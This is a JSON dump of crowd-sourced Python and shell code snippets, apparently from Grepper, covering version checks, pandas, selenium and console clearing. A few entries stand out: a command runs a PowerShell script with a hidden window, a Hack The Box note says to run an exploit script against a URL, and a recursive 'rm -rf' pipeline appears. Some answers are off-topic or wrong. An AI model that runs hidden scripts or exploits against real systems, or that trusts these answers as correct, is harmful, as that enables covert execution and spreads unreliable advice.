    "description": "# To check your Python version in the command line use: python --version  # To check your Python verson inside a script use: import sys print(sys.version)\n# To check python 3 version type in the terimnal:  python3 --version  # To check python 2 version just type:  python --version  # If any errors come up then that means python isn't installed on your # system.\n# in python $ python --version  # in python3 $ python3 --version\npython --version\nHi this is way simple..  Open terminal on your mac Then type python - - version If its give an error that means there is no python installed if it gives you the version number then python is installed..  Any by default python comes installed but the answer was just to make sure you do understand..  Good luck with learning python.. If you need any more with hacking and python let me know i have a YouTube channel just specifically for helping people getting started with hacking and. programming..\n",
    "reg_date": "2021-10-12T11:28:18.000Z"
  },
  {
    "id": 479,
    "keyword": null,
    "link": null,
    "title": " check python version ubuntu",
    "description": "# To check your Python version in the command line use: python --version  # To check your Python verson inside a script use: import sys print(sys.version)\n# View as version vise: for p in $(compgen -c python); do printf \"%-16s\" $p; $p --version; done python2.7      Python 2.7.6 python3.4m     Python 3.4.3  # view as: $ compgen -c python python2.7 python3.4m\npython3 --version\nimport platform print(platform.python_version())\n# check all python version install in ubuntu $ ls /usr/bin/python* # for path and version $ whereis python # for path and version $ which python # for path $ ls -lach /usr/bin/python $ for p in $(compgen -c python); do printf \"%-16s\" $p; $p --version; done\n",
    "reg_date": "2021-10-12T11:28:18.000Z"
  },
  {
    "id": 480,
    "keyword": null,
    "link": null,
    "title": " check string equal with regular expression python",
    "description": "import re pattern = re.compile(\"^([A-Z][0-9]+)+$\") pattern.match(string)\n",
    "reg_date": "2021-10-12T11:28:18.000Z"
  },
  {
    "id": 481,
    "keyword": null,
    "link": null,
    "title": " check string similarity python",
    "description": "from difflib import SequenceMatcher  def similar(a, b):     return SequenceMatcher(None, a, b).ratio()  >>> similar(\"Apple\",\"Appel\") 0.8 >>> similar(\"Apple\",\"Mango\") 0.0\ndef similar(w1, w2):     w1 = w1 + ' ' * (len(w2) - len(w1))     w2 = w2 + ' ' * (len(w1) - len(w2))     return sum(1 if i == j else 0 for i, j in zip(w1, w2)) / float(len(w1)) \n",
    "reg_date": "2021-10-12T11:28:18.000Z"
  },
  {
    "id": 482,
    "keyword": null,
    "link": null,
    "title": " check tensorflow version",
    "description": "import tensorflow as tf tf.__version__\n######## for Python 2.7 pip install --upgrade pip pip install --upgrade tensorflow  ######## for Python 3.n pip3 install --upgrade pip pip3 install --upgrade tensorflow\npython3 import tensorflow as tf tf.__version__\nimport tensorflow as tf  print(tf.__version__)\npython -c 'import tensorflow as tf; print(tf.__version__)'  # for Python 2 on linux python3 -c 'import tensorflow as tf; print(tf.__version__)'  # for Python 3 on linux\npython -c 'import tensorflow as tf; print(tf.__version__)'  # for Python 2 python3 -c 'import tensorflow as tf; print(tf.__version__)'  # for Python 3 \n",
    "reg_date": "2021-10-12T11:28:18.000Z"
  },
  {
    "id": 483,
    "keyword": null,
    "link": null,
    "title": " check the input format of a date python",
    "description": ">>> import datetime >>> def validate(my_str_date):     try:         datetime.datetime.strptime(my_str_date, '%Y-%m-%d')     except ValueError:         raise ValueError(\"Incorrect data format, should be YYYY-MM-DD\")           >>> validate('2003-12-23') >>> validate('2003/12/23')  Traceback (most recent call last):   File \"<stdin>\", line 1, in <module>   File \"<stdin>\", line 5, in validate ValueError: \"Incorrect data format, should be YYYY-MM-DD\" \n",
    "reg_date": "2021-10-12T11:28:18.000Z"
  },
  {
    "id": 484,
    "keyword": null,
    "link": null,
    "title": " check the os in python",
    "description": "from sys import platform if platform == \"linux\" or platform == \"linux2\":     # linux elif platform == \"darwin\":     # OS X elif platform == \"win32\":     # Windows...\n",
    "reg_date": "2021-10-12T11:28:18.000Z"
  },
  {
    "id": 485,
    "keyword": null,
    "link": null,
    "title": " choose random index from list python",
    "description": "import random  foo = ['a', 'b', 'c', 'd', 'e'] print(random.choice(foo))\nrandom.choice(name of list)\nimport random  # Don't forget to install it first with pip install random  ahahfunny = ['ahah ', 'copy-', 'paste ', 'stack overflow',' go ', 'brrr'] #  the biggest index in this list above is 5 (0 being 1 in programming)  print(ahahfunny[random.randint(0, 5)]  # I like this way,        print(random.choice(ahahfunny)) # But this way is WAY thiccer...\nimport random  # with replacement = same item CAN be chosen more than once. # without replacement = same item CANNOT be chosen more then once.  # Randomly select 2 elements from list without replacement and return a list random.sample(list_name, 2)  # Randomly select 3 elements from list with replacement and return a list random.choices(set_name, k=3)  # Returns 1 random element from list random.choice(list_name)\n",
    "reg_date": "2021-10-12T11:28:18.000Z"
  },
  {
    "id": 486,
    "keyword": null,
    "link": null,
    "title": " chromebook install pip",
    "description": "sudo apt-get install python-pip\n",
    "reg_date": "2021-10-12T11:28:18.000Z"
  },
  {
    "id": 487,
    "keyword": null,
    "link": null,
    "title": " chromedriver selenium python",
    "description": "# For Linux, but it is similar for Windows # First make sure first that you have chrome browser installed on your system.  # a simple way to get the driver is:  sudo apt-get install chromium-chromedriver # this will download 75MB of files.  # another way is: 1. Download the lastest version of driver from:   https://sites.google.com/a/chromium.org/chromedriver/ # only 5-7MB 2. Unzip the file. 3. Paste the file in /usr/local/bin using this command:   sudo mv chromedriver /usr/local/bin # this makes sure that the directory is in your PATH variable. 4. Make your file executable:   sudo chmod +x /usr/local/bin/chromedriver  Now you can use this in python:   >>from selenium import webdriver   >>browser = webdriver.Chrome()   # it will work fine\nimport timefrom selenium import webdriverdriver = webdriver.Chrome('/path/to/chromedriver')  # Optional argument, if not specified will search path.driver.get('http://www.google.com/');time.sleep(5) # Let the user actually see something!search_box = driver.find_element_by_name('q')search_box.send_keys('ChromeDriver')search_box.submit()time.sleep(5) # Let the user actually see something!driver.quit()\n",
    "reg_date": "2021-10-12T11:28:19.000Z"
  },
  {
    "id": 488,
    "keyword": null,
    "link": null,
    "title": " ckeditor django",
    "description": "pip install django-ckeditor \n// try collecting static python manage.py collectstatic\n",
    "reg_date": "2021-10-12T11:28:19.000Z"
  },
  {
    "id": 489,
    "keyword": null,
    "link": null,
    "title": " clamp number in python",
    "description": "def clamp(num, min, max):     if num > max:         return max     elif num < min:         return min     else:         return num\n",
    "reg_date": "2021-10-12T11:28:19.000Z"
  },
  {
    "id": 490,
    "keyword": null,
    "link": null,
    "title": " classification report scikit",
    "description": "from sklearn.metrics import classification_report  target_names = ['first_value_y','second_value_y'] # target values  # Print classification report after a train/test split: print(classification_report(y_test, y_pred, target_names=target_names))\n",
    "reg_date": "2021-10-12T11:28:19.000Z"
  },
  {
    "id": 491,
    "keyword": null,
    "link": null,
    "title": " clean crsp pandas",
    "description": "# How to clean CRSP the WRDS database, to calculate Mkt Cap on non financial US firms  CRSP = CRSP[CRSP['SHRCLS'].isin(['NaN', 'A'])] # Keep Share class A or missing  CRSP = CRSP[CRSP['SHRCD'].isin(['10', '11'])] # Keep only sharecode of 10 and 11 CRSP['RET'] = CRSP['RET'].replace(['C','B'],np.nan) # Clean return taking out strings   # Keep value above -50 to avoid any errors  CRSP['RET'] = CRSP['RET'].astype('float') mask = CRSP['RET'] > -50 CRSP = CRSP[mask]  CRSP['PRC'] = CRSP['PRC'].abs() # Keep absolute value of Price   # Calculate Market value with adjustment in Price and Market Value CRSP['market_value'] = ((CRSP['PRC']/CRSP['CFACPR'])*(CRSP['SHROUT']*CRSP['CFACSHR'])).shift(1)  # Take out SIC code with letter z and keep only rows with a SIC  mask_z = CRSP['SICCD'] == 'Z' CRSP['SICCD'] = CRSP['SICCD'][-mask_z] CRSP['SICCD'] = CRSP['SICCD'].dropna().astype(int)  # Keep non financial firms only CRSP = CRSP[~CRSP['SICCD'].between(6000,6999)]  # Change date type from object to datetime and create new colums for month and year CRSP['date'] = pd.to_datetime(CRSP['date']) CRSP['year'] = pd.DatetimeIndex(CRSP['date']).year CRSP['month'] = pd.DatetimeIndex(CRSP['date']).month  # Clean CRSP CRSP.drop(['SHRCD','SHRCLS','PRC','SHROUT','CFACPR','CFACSHR'], axis=1, inplace = True)\n",
    "reg_date": "2021-10-12T11:28:19.000Z"
  },
  {
    "id": 492,
    "keyword": null,
    "link": null,
    "title": " clear all python cache",
    "description": "find . | grep -E \"(__pycache__|\\.pyc|\\.pyo$)\" | xargs rm -rf\nfind . | grep -E \"(__pycache__|\\.pyc|\\.pyo$)\" | xargs rm -rf \na = 10 print a   del a        print a      ## throws an error here because it's been deleted already.\n",
    "reg_date": "2021-10-12T11:28:19.000Z"
  },
  {
    "id": 493,
    "keyword": null,
    "link": null,
    "title": " clear console in python",
    "description": "import sys, os  os.system('cls') \nImport os   os.system(\"clear\") # Linux - OSX os.system(\"cls\") # Windows\nprint('\\033[H\\033[J', end='')\nimport os os.system('cls' if os.name == 'nt' else 'clear')\nimport os  def clearConsole():     command = 'clear'     if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls         command = 'cls'     os.system(command)  clearConsole() \nAs you mentioned, you can do a system call:  For Windows >>> import os >>> clear = lambda: os.system('cls') >>> clear()  For Linux the lambda becomes >>> clear = lambda: os.system('clear')\n",
    "reg_date": "2021-10-12T11:28:19.000Z"
  },
  {
    "id": 494,
    "keyword": null,
    "link": null,
    "title": " clear outpur jupyter",
    "description": "from IPython.display import clear_output  for i in range(10):     clear_output(wait=True)     print(\"Hello World!\") \nfrom IPython.display import clear_output  for i in range(10):     clear_output(wait=True)     print(\"Hello World!\")\n",
    "reg_date": "2021-10-12T11:28:19.000Z"
  },
  {
    "id": 495,
    "keyword": null,
    "link": null,
    "title": " clear output jupyter",
    "description": "from IPython.display import clear_output  for i in range(10):     clear_output(wait=True)     print(\"Hello World!\") \n",
    "reg_date": "2021-10-12T11:28:19.000Z"
  },
  {
    "id": 496,
    "keyword": null,
    "link": null,
    "title": " clear pygame screen",
    "description": "ball = pygame.Rect(0,0,10,10) while True:     mainSurface.fill((0,0,0))     pygame.draw.circle(display,(255,255,255),ball.center,5)     ball.move_ip(1,1)     pygame.display.update() \n",
    "reg_date": "2021-10-12T11:28:19.000Z"
  },
  {
    "id": 497,
    "keyword": null,
    "link": null,
    "title": " clear python list",
    "description": "your_list = [1,2,3,4,5,6,7,8,9,10] your_list.clear() #List becomes [] empty\n# this clear whole elements from list thislist = [\"apple\", \"banana\", \"cherry\"] thislist.clear()\nyourlist = [1,2,3,4,5,6,7,8] del yourlist[:]\n",
    "reg_date": "2021-10-12T11:28:20.000Z"
  },
  {
    "id": 498,
    "keyword": null,
    "link": null,
    "title": " clear screen python",
    "description": "Import os   os.system(\"clear\") # Linux - OSX os.system(\"cls\") # Windows\nprint('\\033[H\\033[J', end='')\nimport os os.system('clear')\ndef clear():         # for windows      if name == 'nt':          _ = system('cls')         # for mac and linux(here, os.name is 'posix')      else:          _ = system('clear') \nimport os  # Windows os.system('cls')  # Linux os.system('clear')\nAs you mentioned, you can do a system call:  For Windows >>> import os >>> clear = lambda: os.system('cls') >>> clear()  For Linux the lambda becomes >>> clear = lambda: os.system('clear')\n",
    "reg_date": "2021-10-12T11:28:20.000Z"
  },
  {
    "id": 499,
    "keyword": null,
    "link": null,
    "title": " clearing all text from a file in python",
    "description": "fileVariable = open('textDocName.txt', 'r+') fileVariable.truncate(0) fileVariable.close()\n",
    "reg_date": "2021-10-12T11:28:20.000Z"
  },
  {
    "id": 500,
    "keyword": null,
    "link": null,
    "title": " clibboard to png",
    "description": "# This is a good website for downloading screenshots!  print(\"https://onpaste.com/\")\n",
    "reg_date": "2021-10-12T11:28:20.000Z"
  },
  {
    "id": 501,
    "keyword": null,
    "link": null,
    "title": " click js selenium python",
    "description": "element = driver.find_element_by_xpath(\"//input[starts-with(@class,'gsc')]\") driver.execute_script(\"arguments[0].click();\", element)\n",
    "reg_date": "2021-10-12T11:28:20.000Z"
  },
  {
    "id": 502,
    "keyword": null,
    "link": null,
    "title": " close chrome selenium python",
    "description": "driver.quit() \n",
    "reg_date": "2021-10-12T11:28:20.000Z"
  },
  {
    "id": 503,
    "keyword": null,
    "link": null,
    "title": " close selenium webdriver python",
    "description": "driver.close()\n# driver.close() closes one tab # driver.quit() quits the session  # this closes all tabs but doesnt quit the session as a whole alltabs = driver.window_handles for i in range(len(alltabs)): \tdriver.switch_to.window(alltabs[i]) \tdriver.close();sleep(1)\ndriver.quit()\n",
    "reg_date": "2021-10-12T11:28:20.000Z"
  },
  {
    "id": 504,
    "keyword": null,
    "link": null,
    "title": " close terminal python",
    "description": "exit()\n",
    "reg_date": "2021-10-12T11:28:20.000Z"
  },
  {
    "id": 505,
    "keyword": null,
    "link": null,
    "title": " cmd run ps1 file in background",
    "description": "powershell.exe -windowstyle hidden -file C:\\\\iis_test.ps1\n",
    "reg_date": "2021-10-12T11:28:20.000Z"
  },
  {
    "id": 506,
    "keyword": null,
    "link": null,
    "title": " code for making an exe file for python",
    "description": "pip install pyinstaller  cd PathOfFile  pyinstaller --onefile -w ScriptName.py  (note that if you are using -w then your python file has to be an application and the file will be inside the \"dist\" folder)\npip install pyinstaller  cd FullPathOfFile in cmd console pyinstaller --onefile pythonScriptName.py # a .exe file is created in the FullPathOfFile\\dist\nimport os os.startfile(\"C:\\Documents and Settings\\flow_model\\flow.exe\")\n",
    "reg_date": "2021-10-12T11:28:20.000Z"
  },
  {
    "id": 507,
    "keyword": null,
    "link": null,
    "title": " code for showing contents of a file and printing it in python",
    "description": "import os  with open(\"filename\", \"r+\") as file:     content = file.readline()     while(content!=\"\"):       \tprint(content)         content = file.readline()     file.close     \n",
    "reg_date": "2021-10-12T11:28:21.000Z"
  },
  {
    "id": 508,
    "keyword": null,
    "link": null,
    "title": " code how pandas save csv file",
    "description": "df.to_csv('out.csv')\nSELECT DANAME, DRINKKCODE FROM SOFTDRINK WHERE PRICES BETWEEN1 12 AND 18\n",
    "reg_date": "2021-10-12T11:28:21.000Z"
  },
  {
    "id": 509,
    "keyword": null,
    "link": null,
    "title": " code to change default browser to chrome in web browser module",
    "description": "import webbrowser chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s' webbrowser.get(chrome_path).open('http://docs.python.org/')\n",
    "reg_date": "2021-10-12T11:28:21.000Z"
  },
  {
    "id": 510,
    "keyword": null,
    "link": null,
    "title": " code to run gif tkinter",
    "description": "#code by TigerhawkT3 (on YT and github) import tkinter from PIL import Image, ImageTk, ImageSequence  class App:     def __init__(self, parent):         self.parent = parent         self.canvas = tkinter.Canvas(parent, width=400, height=400)         self.canvas.pack()         self.sequence = [ImageTk.PhotoImage(img)                             for img in ImageSequence.Iterator(                                     Image.open(                                     r'gif2.gif'))]         self.image = self.canvas.create_image(200,200, image=self.sequence[0])         self.animate(1)     def animate(self, counter):         self.canvas.itemconfig(self.image, image=self.sequence[counter])         self.parent.after(20, lambda: self.animate((counter+1) % len(self.sequence)))  root = tkinter.Tk() app = App(root) root.mainloop()\n",
    "reg_date": "2021-10-12T11:28:21.000Z"
  },
  {
    "id": 511,
    "keyword": null,
    "link": null,
    "title": " codeforces - 570b python",
    "description": "sizeOfRange,otherpick=map(int,input().split()) if(sizeOfRange==1 and otherpick==1):     print(sizeOfRange)#1 number cant really fight can you else:     if(sizeOfRange/2<otherpick):         print(otherpick-1)     else:         print(otherpick+1) #so in a show of guessing the price of a object #there is only 2 contestent #price of the product 100 #first person says the price is 50 you just say its 50+1 or and you win #you can say its 50-1 #either way its 50/50 chance of wining\n",
    "reg_date": "2021-10-12T11:28:21.000Z"
  },
  {
    "id": 512,
    "keyword": null,
    "link": null,
    "title": " codegrepper",
    "description": "\"You are not paid to write code, You are paid to solve problems\"  Word to the wise.  Basically - 99% of the problems you have someone have already encountered before and uploaded a working solution to the internet.  Find that solution and 90% of your problem is solved. the next 10% is only  adapting the already working solution to fit your specific needs.  Of course, you can choose to go the hard way, but then you violate one of  my personal top 3 favorite principles: DRTW - Don't Reinvent The Wheel.\nyou found gold\nWelcome to code grepper community. https://www.codegrepper.com/app/profile.php?id=57722 We are happy you are here.  \nGrepper is a google chrome extension, created to make programmers' life a bit easier when searching for code snippets. Once installed, when you google search a problem, &ldquo;React forms&rdquo; in my example, Grepper will populate snippets of codes most related to your search.\nthere are no grepper answers to this !!  well i ruined it\n+----------------------------------------------------------------------+ |So You have installed Code Grepper. It's a very great tool for coders.| +----------------------------------------------------------------------+\nwhy are you searching for \"codegrepper\" when you already have it?\nwerged fg\n",
    "reg_date": "2021-10-12T11:28:21.000Z"
  },
  {
    "id": 513,
    "keyword": null,
    "link": null,
    "title": " coderbyte founded by",
    "description": "2012 by Daniel Borowski\n",
    "reg_date": "2021-10-12T11:28:21.000Z"
  },
  {
    "id": 514,
    "keyword": null,
    "link": null,
    "title": " colab cuda version",
    "description": "#in colab cell !nvcc --version\n",
    "reg_date": "2021-10-12T11:28:21.000Z"
  },
  {
    "id": 515,
    "keyword": null,
    "link": null,
    "title": " colab mount drive",
    "description": "from google.colab import drive drive.mount('/content/drive')  #Optional: move to the desired location: %cd drive/My Drive/DIRECTORY_IN_YOUR_DRIVE\nfrom google.colab import drive drive.mount(\"/content/gdrive\")\nfrom google.colab import drive drive.mount('/content/drive')\nfrom google.colab import files files.upload()\n",
    "reg_date": "2021-10-12T11:28:21.000Z"
  },
  {
    "id": 516,
    "keyword": null,
    "link": null,
    "title": " colab save figure",
    "description": "from google.colab import files plt.savefig(\"abc.png\") files.download(\"abc.png\") \n",
    "reg_date": "2021-10-12T11:28:21.000Z"
  },
  {
    "id": 517,
    "keyword": null,
    "link": null,
    "title": " collections.counter in python",
    "description": ">>> from collections import Counter >>>  >>> myList = [1,1,2,3,4,5,3,2,3,4,2,1,2,3] >>> print Counter(myList) Counter({2: 4, 3: 4, 1: 3, 4: 2, 5: 1}) >>> >>> print Counter(myList).items() [(1, 3), (2, 4), (3, 4), (4, 2), (5, 1)] >>>  >>> print Counter(myList).keys() [1, 2, 3, 4, 5] >>>  >>> print Counter(myList).values() [3, 4, 4, 2, 1] \n>>> # regular unsorted dictionary >>> d = {'banana': 3, 'apple': 4, 'pear': 1, 'orange': 2}  >>> # dictionary sorted by key >>> OrderedDict(sorted(d.items(), key=lambda t: t[0])) OrderedDict([('apple', 4), ('banana', 3), ('orange', 2), ('pear', 1)])  >>> # dictionary sorted by value >>> OrderedDict(sorted(d.items(), key=lambda t: t[1])) OrderedDict([('pear', 1), ('orange', 2), ('banana', 3), ('apple', 4)])  >>> # dictionary sorted by length of the key string >>> OrderedDict(sorted(d.items(), key=lambda t: len(t[0]))) OrderedDict([('pear', 1), ('apple', 4), ('orange', 2), ('banana', 3)]) \n# importing the collections module import collections # intializing the arr arr = [1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 3] # getting the elements frequencies using Counter class elements_count = collections.Counter(arr) # printing the element and the frequency for key, value in elements_count.items():    print(f\"{key}: {value}\")\n>>> Counter('abracadabra').most_common(3) [('a', 5), ('r', 2), ('b', 2)] \nlist = [\"a\",\"c\",\"c\",\"a\",\"b\",\"a\",\"a\",\"b\",\"c\"] cnt = Counter(list) od = OrderedDict(cnt.most_common()) for key, value in od.items():     print(key, value) \nclass collections.Counter([iterable-or-mapping])\n",
    "reg_date": "2021-10-12T11:28:22.000Z"
  },
  {
    "id": 518,
    "keyword": null,
    "link": null,
    "title": " color name to hex python",
    "description": "import matplotlib print(matplotlib.colors.cnames[\"blue\"])   --> u'#0000FF'   \n",
    "reg_date": "2021-10-12T11:28:22.000Z"
  },
  {
    "id": 519,
    "keyword": null,
    "link": null,
    "title": " color to black and white cv2",
    "description": "import cv2  originalImage = cv2.imread(\"PATH/TO/IMG\") grayImage = cv2.cvtColor(originalImage, cv2.COLOR_BGR2GRAY)\n",
    "reg_date": "2021-10-12T11:28:22.000Z"
  },
  {
    "id": 520,
    "keyword": null,
    "link": null,
    "title": " colorama",
    "description": "from colorama import Fore, Back, Style print(Fore.RED + 'some red text') print(Back.GREEN + 'and with a green background') print(Style.DIM + 'and in dim text') print(Style.RESET_ALL) print('back to normal now') \nHack the box - buff   Guys, this problem took me 1 day to find the problem and the issue is the script needs python 2.7 and is missing libraries. You'll need to install them.  Open terminal: Install Python 2.7 sudo apt-get install python-pip  Install pip sudo pip install requests  Install colorama sudo pip install colorama  Run exploit: python exploitname.py url  Happy Hacking!\n# Source: #         https://www.youtube.com/watch?v=u51Zjlnui4Y #         https://github.com/techwithtim/ColoredTextInPython  import colorama from colorama import Fore, Back, Style colorama.init(autoreset=True)  print('\\033[31m' + 'some red text') print('\\033[39m')  # and reset to default color print() print(f\"{Fore.RED}C{Fore.GREEN}O{Fore.YELLOW}L{Fore.BLUE}O{Fore.MAGENTA}R{Fore.CYAN}S{Fore.WHITE}!\") print(f\"{Fore.RED}Red Text\") print(f\"{Fore.GREEN}Green Text\") print(f\"{Fore.YELLOW}Yellow Text\") print(f\"{Fore.BLUE}Blue Text\") print(f\"{Fore.MAGENTA}Magenta Text\") print(f\"{Fore.CYAN}Cyan Text\") print(f\"{Fore.WHITE}White Text\") print() print(f\"{Back.RED}B{Back.GREEN}A{Back.YELLOW}C{Back.BLUE}K{Back.MAGENTA}G{Back.CYAN}R{Back.WHITE}O{Back.RED}U{Back.GREEN}N{Back.YELLOW}D{Back.BLUE}!\") print(f\"{Back.RED}Red Background\") print(f\"{Back.GREEN}Green Background\") print(f\"{Back.YELLOW}Yellow Background\") print(f\"{Back.BLUE}Blue Background\") print(f\"{Back.MAGENTA}Magenta Background\") print(f\"{Back.CYAN}Cyan Background\") print(f\"{Back.WHITE}White Background\") print() print(f\"{Style.DIM}S{Style.NORMAL}T{Style.BRIGHT}Y{Style.DIM}L{Style.NORMAL}E{Style.BRIGHT}!\") print(f\"{Style.DIM}Dim Text\") print(f\"{Style.NORMAL}Normal Text\") print(f\"{Style.BRIGHT}Bright Text\") print() print(f\"{Fore.YELLOW}{Back.RED}C{Back.GREEN}{Fore.RED}O{Back.YELLOW}{Fore.BLUE}M{Back.BLUE}{Fore.BLACK}B{Back.MAGENTA}{Fore.CYAN}I{Back.CYAN}{Fore.GREEN}N{Back.WHITE}A{Back.RED}T{Back.GREEN}I{Back.YELLOW}O{Back.BLUE}N\") print(f\"{Fore.GREEN}{Back.YELLOW}{Style.BRIGHT}Green Text - Yellow Background - Bright\") print(f\"{Fore.CYAN}{Back.WHITE}{Style.DIM}Cyan Text - White Background - Dim\")   ''' Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET. Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET. Style: DIM, NORMAL, BRIGHT, RESET_ALL '''\nInstalling with pip is almost always the way to go.  It will handle downloading the package for you, as well as any dependencies.  If you do not have pip,  see http://www.pip-installer.org/en/latest/installing.html.  Then  pip install colorama or sudo pip install colorama  Ba-boom! Done.  Source https://stackoverflow.com/questions/9846683/how-to-install-colorama-python\nfrom colorama import Fore, Back, Style , init  init() # crucial on windows but on other platforms it has no effect  print(Fore.RED + 'some red text') print(Back.GREEN + 'and with a green background') print(Style.DIM + 'and in dim text') print(Style.RESET_ALL) print('back to normal now')\n",
    "reg_date": "2021-10-12T11:28:22.000Z"
  },
  {
    "id": 521,
    "keyword": null,
    "link": null,
    "title": " column dataframe to int",
    "description": "df[[column_name]].astype(int)\n# convert all columns of DataFrame df = df.apply(pd.to_numeric) # convert all columns of DataFrame  # convert just columns \"a\" and \"b\" df[[\"a\", \"b\"]] = df[[\"a\", \"b\"]].apply(pd.to_numeric)\n# convert Series my_series = pd.to_numeric(my_series)  # convert column \"a\" of a DataFrame df[\"a\"] = pd.to_numeric(df[\"a\"]) \n",
    "reg_date": "2021-10-12T11:28:22.000Z"
  },
  {
    "id": 522,
    "keyword": null,
    "link": null,
    "title": " column of type int to date pandas",
    "description": "df['DataFrame Column'] = pd.to_datetime(df['DataFrame Column'], format=specify your format)  #Example import pandas as pd  values = {'dates':  [20190902,20190913,20190921],           'status': ['Opened','Opened','Closed']           }  df = pd.DataFrame(values, columns = ['dates','status'])  df['dates'] = pd.to_datetime(df['dates'], format='%Y%m%d')  print (df) print (df.dtypes) \n# convert the 'Date' column to datetime format df['Date']= pd.to_datetime(df['Date'])   # Check the format of 'Date' column df.info()\ndf['time'] = df['time'].apply(lambda x: x.value) \n",
    "reg_date": "2021-10-12T11:28:22.000Z"
  },
  {
    "id": 523,
    "keyword": null,
    "link": null,
    "title": " column standardization pandas",
    "description": "columns = ['A', 'B','C'] #specify the column names for col in columns:   df[col] = (df[col] - df[col].mean())/df[col].std()    \n",
    "reg_date": "2021-10-12T11:28:22.000Z"
  },
  {
    "id": 524,
    "keyword": null,
    "link": null,
    "title": " columns to dictionary pandas",
    "description": "pd.Series(df.A.values,index=df.B).to_dict()\ndf.set_index('columnName').T.to_dict()\n",
    "reg_date": "2021-10-12T11:28:22.000Z"
  },
  {
    "id": 525,
    "keyword": null,
    "link": null,
    "title": " comb function in python",
    "description": "import math     n = 10 k = 2    # Get the number of ways to choose  # k items from n items without  # repetition and without order  nCk = math.comb(n, k)  print(nCk) \n",
    "reg_date": "2021-10-12T11:28:22.000Z"
  },
  {
    "id": 526,
    "keyword": null,
    "link": null,
    "title": " combine all items in a list python",
    "description": ">> a = ['a', 'b', 'c'] >> res = \"\".join(a) >> print(res) abc\n",
    "reg_date": "2021-10-12T11:28:22.000Z"
  },
  {
    "id": 527,
    "keyword": null,
    "link": null,
    "title": " combine date and time python",
    "description": "import datetime date = datetime.date(2012, 2, 12) time = datetime.time(1, 30) combined = datetime.datetime.combine(date, time)\n",
    "reg_date": "2021-10-12T11:28:23.000Z"
  },
  {
    "id": 528,
    "keyword": null,
    "link": null,
    "title": " combining 2 dataframes pandas",
    "description": "df_3 = pd.concat([df_1, df_2]) \n# Joins with another DataFrame  df.join(df2, df.name == df2.name, 'outer').select(   df.name, df2.height).collect() # [Row(name=None, height=80), Row(name=u'Bob', height=85), Row( #   name=u'Alice', height=None)]  df.join(df2, 'name', 'outer').select('name', 'height').collect() # [Row(name=u'Tom', height=80), Row(name=u'Bob', height=85), Row( #   name=u'Alice', height=None)]  cond = [df.name == df3.name, df.age == df3.age] df.join(df3, cond, 'outer').select(df.name, df3.age).collect() # [Row(name=u'Alice', age=2), Row(name=u'Bob', age=5)]  df.join(df2, 'name').select(df.name, df2.height).collect() # Row(name=u'Bob', height=85)]  df.join(df4, ['name', 'age']).select(df.name, df.age).collect() # [Row(name=u'Bob', age=5)]\n# Pandas for Python  df['col1 & col2'] = df['col1']+df['col2']  #Output #col1\tcol2\tcol1 & col2 #A1\t\tA2\t\tA1A2 #B1\t\tB2\t\tB1B2\n",
    "reg_date": "2021-10-12T11:28:23.000Z"
  },
  {
    "id": 529,
    "keyword": null,
    "link": null,
    "title": " combining list of list to single list python",
    "description": "import itertools a = [['a','b'], ['c']] print(list(itertools.chain.from_iterable(a))) \nflat_list = [item for sublist in t for item in sublist]\nimport itertools a = [['a','b'], ['c']] print(list(itertools.chain.from_iterable(a)))\n",
    "reg_date": "2021-10-12T11:28:23.000Z"
  },
  {
    "id": 530,
    "keyword": null,
    "link": null,
    "title": " comibataion of two list",
    "description": "a = [\"foo\", \"melon\"] b = [True, False] c = list(itertools.product(a, b)) >> [(\"foo\", True), (\"foo\", False), (\"melon\", True), (\"melon\", False)]\n",
    "reg_date": "2021-10-12T11:28:23.000Z"
  },
  {
    "id": 531,
    "keyword": null,
    "link": null,
    "title": " command prompt pause in python",
    "description": "# Don't use os.system(\"pause\"), it is very slow because it needs to create # an entire shell process. Use this instead:  import getch  def pause():   print(\"Press any key to continue . . . \")   getch.getch()\n",
    "reg_date": "2021-10-12T11:28:23.000Z"
  },
  {
    "id": 532,
    "keyword": null,
    "link": null,
    "title": " command to update pip",
    "description": "python -m pip install --upgrade pip\n#for updating pip type the following command in terminal or cmd or powershell python -m pip install --upgrade pip\n",
    "reg_date": "2021-10-12T11:28:23.000Z"
  },
  {
    "id": 533,
    "keyword": null,
    "link": null,
    "title": " comment choisir tout les caractère d'un str sauf les deux dernier python",
    "description": "'''pour afficher toutes une var str sauf ses deux derniers caract&egrave;res : ''' var = \"abcd\" print(var[0:-2]) # renverra : ab\n",
    "reg_date": "2021-10-12T11:28:23.000Z"
  },
  {
    "id": 534,
    "keyword": null,
    "link": null,
    "title": " comment concatener deux listes python",
    "description": "def concatene(l1,l2):   return l1 + l2\n",
    "reg_date": "2021-10-12T11:28:23.000Z"
  },
  {
    "id": 535,
    "keyword": null,
    "link": null,
    "title": " comment utiliser la base de donnees historique de google chrome dans un projet",
    "description": "print(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:28:23.000Z"
  },
  {
    "id": 536,
    "keyword": null,
    "link": null,
    "title": " como unir dos listas python",
    "description": "lista1 = [1, 2, 3] lista2 = [4, 5, 6] nueva_lista = lista1 + lista2\n",
    "reg_date": "2021-10-12T11:28:24.000Z"
  },
  {
    "id": 537,
    "keyword": null,
    "link": null,
    "title": " compare two linked list python",
    "description": "class SinglyLinkedListNode:     def __init__(self, node_data):         self.data = node_data         self.next = None   class SinglyLinkedList:     def __init__(self):         self.head = None         self.tail = None      def insert_node(self, node_data):         node = SinglyLinkedListNode(node_data)          if not self.head:             self.head = node         else:             self.tail.next = node          self.tail = node   def print_singly_linked_list(node, sep, fptr):     while node:         fptr.write(str(node.data))          node = node.next          if node:             fptr.write(sep)   def printt(headd):     itr = headd     llstr = []     while itr:         llstr.append(itr.data)         itr = itr.next     return llstr   def compare_lists(llist1, llist2):     ll1 = printt(llist1)     ll2 = printt(llist2)     if ll1 == ll2:         return 'Same'     else:         return 'Not Same'   if __name__ == '__main__':      llist1_count = int(input(\"Number of nodes in LinkedList1: \"))      llist1 = SinglyLinkedList()     print(\"Enter the value to be stored on linkedlist 1: \")     for _ in range(llist1_count):         llist1_item = input()         llist1.insert_node(llist1_item)      print('\\n')     llist2_count = int(input(\"Number of nodes in LinkedList2: \"))      llist2 = SinglyLinkedList()      print(\"Enter the value to be stored on linkedlist 2: \")     for _ in 